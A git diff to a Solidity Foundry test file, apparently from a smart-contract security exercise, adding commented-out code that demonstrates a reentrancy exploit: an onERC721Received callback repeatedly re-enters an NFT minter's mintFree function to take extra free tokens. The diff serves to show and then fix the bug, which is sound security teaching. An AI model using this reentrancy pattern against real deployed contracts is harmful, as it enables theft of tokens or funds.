@@ -122,4 +122,63 @@ contract GoldMinterTest is Test /*, IERC721Receiver*/ {
          * - 2 expectReverts, 3 calls to mintFree, and 1 assert
          */
     }
+
+    // function test_exploitReentrancy() public {
+    //     // nota: ejecutando transacción como carlos
+    //     vm.stopPrank();
+    //     uint256 amount = nftmin.PRIZE_THRESHOLD();
+    //     uint256 cost = nftmin.PRICE_TO_PAY() * amount;
+    //     nftmin.mintMany{value: cost}(amount);
+
+    //     // exploit context
+    //     exploitActive = true;
+    //     exploitMaxCount = 5;
+    //     nftmin.mintFree();
+
+    //     // chequear si funcionó
+    //     assertEq(
+    //         nftmin.nft().balanceOf(address(this)),
+    //         amount + exploitMaxCount + 1
+    //     );
+
+    //     /** TODO:
+    //    * - we need a contract to control the flow of execution
+    //    * - we need to successfully trigger mintFree
+    //    * - once control is taken, we develop the logic of the exploit
+    //    * - we create its context before calling, and its behavior in onERC721
+    //    * - check that it worked effectively
+    //    * - fix the error and hope it fails
+    //    */
+    // }
+
+    // function onERC721Received(
+    //     address operator,
+    //     address from,
+    //     uint256 tokenId,
+    //     bytes calldata data
+    // ) external returns (bytes4) {
+    //     if (exploitActive && exploitCount < exploitMaxCount) {
+    //         exploitCount++;
+    //         nftmin.mintFree();
+    //     }
+    //     return IERC721Receiver.onERC721Received.selector;
+    // }
+
+    // // working exploit
+    // function onERC721Received(
+    //     address operator,
+    //     address from,
+    //     uint256 tokenId,
+    //     bytes calldata data
+    // ) external returns (bytes4) {
+    //     if (exploitReent && exploitCount < exploitMaxCount) {
+    //         exploitCount++;
+    //         NFTMinter(payable(address(operator))).mintFree();
+    //         // analog to nftmin.mintFree();
+    //     } else {
+    //         exploitReent = false;
+    //         delete exploitCount;
+    //     }
+    //     return IERC721Receiver.onERC721Received.selector;
+    // }
 }
